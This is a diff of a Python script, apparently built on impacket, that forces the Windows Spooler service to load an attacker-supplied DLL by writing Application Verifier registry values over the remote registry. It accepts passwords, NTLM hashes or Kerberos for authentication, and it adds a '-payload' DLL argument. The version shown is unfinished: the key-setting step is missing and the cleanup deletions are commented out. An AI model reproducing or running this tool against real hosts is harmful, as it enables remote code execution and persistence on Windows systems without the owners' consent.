@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 #
-# Forces a DLL to be loaded into a target process
-# as SYSTEM using
+# Forces a DLL to be loaded into Spooler using
+# Application Verifiers
 #
 import sys
 import argparse
@@ -32,6 +32,8 @@ class AppVerif:
         self.__remoteOps     = None
         self.__smbConnection = None
         self.__rrp           = None
+        self.__regKeyHnd     = None
+        self.__hkeylocal     = None
 
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split( ':' )
@@ -44,11 +46,19 @@ class AppVerif:
         else:
             self.__smbConnection.kerberoslogin( self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, kdcHost = self.__kdcHost );
 
+        # connect to remote registry
         self.__remoteOps = RemoteOperations( self.__smbConnection, self.__doKerberos, self.__kdcHost )
-        self.__remoteOps.enableRegistry()
+        self.__remoteOps.enableRegistry();
 
-        ans = rrp.hOpenLocalMachine( self.__remoteOps.getRRP() );
+        # connect to remote registry
+        key = rrp.hOpenPerformanceData( self.__remoteOps.getRRP() );
+        rrp.hBaseRegQueryValue( self.__remoteOps.getRRP(), key['phKey'], 'OLD_Global' );
+        rrp.hBaseRegCloseKey( self.__remoteOps.getRRP(), key['phKey' ] );
     def cleanup( self ):
+        if self.__regKeyHnd and self.__remoteOps:
+            pass
+            #rrp.hBaseRegDeleteValue( self.__remoteOps.getRRP(), self.__regKeyHnd['phkResult'], 'VerifierDLLs' );
+            #rrp.hBaseRegDeleteValue( self.__remoteOps.getRRP(), self.__regKeyHnd['phkResult'], 'GlobalFlag' );
         if self.__remoteOps:
             self.__remoteOps.finish()
         if self.__smbConnection:
@@ -57,6 +67,7 @@ class AppVerif:
 if __name__ in '__main__':
     parser = argparse.ArgumentParser( add_help = True, description = 'Forces a process to load a DLL through the remote registry.' )
     parser.add_argument( 'target', action = 'store', help = '[[domain/]username[:password]@]<targetName or address>' );
+    parser.add_argument( '-payload', action = 'store', help = 'Path to a DLL on the target to load.' );
     
     group = parser.add_argument_group( 'authentication' );
     group.add_argument( '-hashes', action = 'store', metavar = 'LMHASH:NTHASH', help = 'NTLM hashes, format is LMHASH:NTHASH' )
@@ -90,5 +101,6 @@ if __name__ in '__main__':
         Ver = AppVerif( username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip );
         Ver.run( address )
         Ver.cleanup()
-    except:
-        if Mon is not None: Mon.cleanup()
+    except Exception as e:
+        print( e );
+        if Ver is not None: Ver.cleanup()
